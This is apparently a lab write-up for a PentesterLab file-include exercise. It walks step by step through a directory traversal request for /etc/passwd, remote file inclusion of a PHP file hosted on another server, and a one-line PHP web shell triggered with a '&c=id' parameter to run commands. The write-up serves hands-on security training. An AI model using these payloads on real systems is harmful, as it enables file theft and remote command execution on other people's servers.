## Solution
1. Visiting the web-page, and viewing the URL, we see a command: `?page=intro.php` 
2. Adding a single-quote (') at the end of `.php` gives us an error stating: 
```
Warning: include(intro.php'): failed to open stream: No such file or directory in /var/www/index.php on line 13

Warning: include(): Failed opening 'intro.php'' for inclusion (include_path='.:/usr/share/php:/usr/share/pear') in /var/www/index.php on line 13
The objective of this exercise is to find the File Include vulnerability in this page.
```
3. This states that the `include()` parameter is directly included in the code.
4. So what we can do is use the `include()` parameter as directory traversal
```
https://demo.libcurl.so/?page=../../../../etc/passwd
``` 
5. Now, we check whether the server has been configured in a way that allows us to load files from another server
```
https://ptl-610142fe-f0b4de00.libcurl.so/?page=http://www.google.com
```
6. After this, we try to load the malicious payload provided in the course to test if it works
```
https://ptl-610142fe-f0b4de00.libcurl.so/?page=http://assets.pentesterlab.com/test_include.txt
```
7. Here, we can see that the malicioud payload works too. The site `http://assets.pentesterlab.com/test_include.txt` contains a php code which on callingg up by `demo.libcurl.so` gets executed and the result is displayed to us.
8. Now, we can try to load `test_include_system.txt` but this doesn't work. On visiting the page, the page contains basic php code which call the `system` function and takes an arguement from the URL, a parameter named `c`, the code is: 
```php
<?php
  system($_GET['c']);
?>
```
9. So now here, if we add `c` in payload then we're probably gonna be able to run the command.
10. The thing is to add it properly and that's probably the hard part.
11. We dont have to do something like this: `?c=id`, because thats just gonna use `c` parameter when accessing that file, so its not gonna do anything because thats when the file is loaded.
12. What we want is `c` to be just another parameter when we load the page, so we're gonna use the `&` instead of using `?`
13. The given below code would not work because of the reason on like 11 
```
/?page=http://assets.pentesterlab.com/test_include_system.txt?c=id
```
14. To gain command execution, we need to perform the following:
```
/?page=http://assets.pentesterlab.com/test_include_system.txt&c=id
```
15. Add the `score` command instead of `id` helps in marking the exercise complete
